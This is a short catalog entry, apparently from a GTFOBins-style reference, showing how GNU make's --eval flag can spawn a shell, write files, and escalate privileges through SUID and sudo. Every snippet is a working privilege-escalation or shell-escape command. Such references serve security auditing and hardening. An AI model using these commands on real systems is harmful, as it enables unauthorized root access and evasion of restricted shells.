---
description: All these examples only work with GNU `make` due to the lack of support of the `--eval` flag. The same can be achieved by using a proper `Makefile` or by passing the content via stdin using `-f -`.
functions:
  shell:
    - code: |
        COMMAND='/bin/sh'
        make -s --eval=$'x:\n\t-'"$COMMAND"
  file-write:
    - description: Requires a newer GNU `make` version.
      code: |
        LFILE=file_to_write
        make -s --eval="\$(file >$LFILE,DATA)" .
  suid:
    - code: |
        COMMAND='/bin/sh -p'
        ./make -s --eval=$'x:\n\t-'"$COMMAND"
  sudo:
    - code: |
        COMMAND='/bin/sh'
        sudo make -s --eval=$'x:\n\t-'"$COMMAND"
---
